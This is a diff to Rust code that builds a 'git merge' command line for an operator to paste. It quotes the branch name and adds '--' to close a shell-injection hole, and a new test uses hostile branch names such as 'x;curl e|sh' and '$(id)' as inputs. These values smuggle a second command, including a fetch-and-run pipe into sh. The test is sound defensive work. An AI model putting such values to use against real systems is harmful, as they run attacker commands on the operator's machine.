@@ -464,8 +464,11 @@ pub fn landed_line(branch: &str, commit: &str) -> String {
 /// a plain `git merge` would lay its commits flat onto the parent's line, and the history would no
 /// longer say which of them one node did. The merge commit keeps the child's work visible — and
 /// revertable, `git revert -m 1` — as one unit.
+///
+/// The operator pastes it into a shell, and a branch name is whatever a node's worktree had
+/// checked out, so the name is one quoted word after `--`: never a second command, never a flag.
 pub fn merge_command(branch: &str) -> String {
-    format!("git merge --no-ff {branch}")
+    format!("git merge --no-ff -- {}", crate::text::shell_quote(branch))
 }
 
 /// The tokens one node's run spent, as its harness's own stream reported them.
@@ -601,8 +604,21 @@ mod tests {
     #[test]
     fn the_landed_line_names_the_one_merge_command() {
         let b = "marion/01a0e64e-433c-7375-a613-f205ee674759";
-        assert_eq!(merge_command(b), format!("git merge --no-ff {b}"));
+        assert_eq!(merge_command(b), format!("git merge --no-ff -- {b}"));
         assert!(landed_line(b, "416b95c0123456789").ends_with(&merge_command(b)));
+    }
+
+    /// **A branch name pasted from the merge line is one argument, never an option or a
+    /// command**: shell words are quoted, and `--` keeps a leading dash from reading as a flag.
+    #[test]
+    fn the_merge_command_quotes_the_branch_and_ends_the_options() {
+        assert_eq!(
+            merge_command("x;curl e|sh"),
+            "git merge --no-ff -- 'x;curl e|sh'"
+        );
+        assert_eq!(merge_command("$(id)"), "git merge --no-ff -- '$(id)'");
+        assert_eq!(merge_command("it's"), r"git merge --no-ff -- 'it'\''s'");
+        assert_eq!(merge_command("-x"), "git merge --no-ff -- -x");
     }
 
     #[test]
